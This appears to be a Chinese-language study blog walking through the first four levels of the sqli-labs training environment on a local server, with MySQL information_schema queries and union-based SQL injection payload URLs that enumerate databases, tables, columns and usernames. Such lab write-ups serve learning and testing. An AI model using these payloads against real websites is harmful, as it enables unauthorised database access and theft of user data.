Sqli-labs

之前早就安装了sqli-labs，最近才拿出来系统的进行学习修炼.
环境的安装过程也很简单，主要是需要wamp这个集成化服务器软件，百度安装教程一大堆.
闲话不多说，开始我们的修炼之路！

mysql基本操作

首先我们需要熟悉mysql的一些基本操作命令，通过以下命令进行数据的查询.
show databases;是查询有哪些数据库

use information_schema;选定该数据库
show tables;查看该数据库中的表

desc tables;查看该表的结构

‘select table_name from information_schema.tables where table_schema=’security’;’查询数据库security中的表名

通过以上的数据查询，我们可以发现，Mysql中的系统数据库information_schema,对的，就是该数据库中存储着所有的数据库相关信息，一般情况我们只要利用该表就可以完成注入.
猜数据库
select schema_name from information_schema.schemata
猜某库的数据表
select table_name from information_schema.tables where table_schema=’xxx’
猜某表的所有列
Select column_name from information_schema.columns where table_name=’xxx’
获取某列的内容
Select *** from ****

Less-1

首先尝试http://127.0.0.1/sqli-labs-master/Less-1/?id=1 是可以登陆成功的
继续构造http://127.0.0.1/sqli-labs-master/Less-1/?id=1' 发现页面报错
继续将后面的注释掉http://127.0.0.1/sqli-labs-master/Less-1/?id=1'--+ 登陆成功
继续构造http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2–+ 登陆失败
继续构造http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1–+ 登陆成功
所以payload：http://127.0.0.1/sqli-labs-master/Less-1/?id=1' xxxx–+

查看列数http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 3–+ 数字从1依次递增尝试，发现到4就会报错，所以一共有三列

构造查询数据库:http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,schema_name from information_schema.schemata –+
但是我们会发现，只有显示了一个数据库的名称，那我们如何去查看其他的数据库呢？

我们有两种方式来查看其他数据库，第一种，因为按照我们上面的payload只能显示一列的数据库，所以他才会显示了一个数据库，我们构造http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,schema_name from information_schema.schemata limit 1,1–+ 通过limit去查询下面几列的数据库，第一个数字是控制起始的行数(包含0)，第二个数子是控制查询几行。
但是这样一个一个查询起来很麻烦.所以我们有第二种方法，通过group_concat()连接一个组的所有字符串，构造：http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata –+

构造查询security库的所有数据表:http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+

构造查询users数据表的所有列:http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –+

查询username列的所有内容：http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(username) from users–+

Less-2

我们继续按照第一个的测试方法，寻找注入点，当添加单引号是报错，可以发现引号似乎多余了，查询代码使用了整数，不需要引号的闭合。

构造如下payload：http://127.0.0.1/sqli-labs-master/Less-2/?id=1 xxx–+
其他的查询方式和第一个一模一样.

Less-3

继续测试注入点，发现这次似乎多出一个),所以我们只要闭合它就绕过了.

payload如下：http://127.0.0.1/sqli-labs-master/Less-3/?id=1') xxx –+
其他的查询方式也是和第一个一模一样.

Less-4

继续测试寻找注入点，这次是一个”)的闭合，我们将其闭合绕过.

payload:http://127.0.0.1/sqli-labs-master/Less-4/?id=1") xxx –+
其他的查询方式依旧是和第一个一模一样.
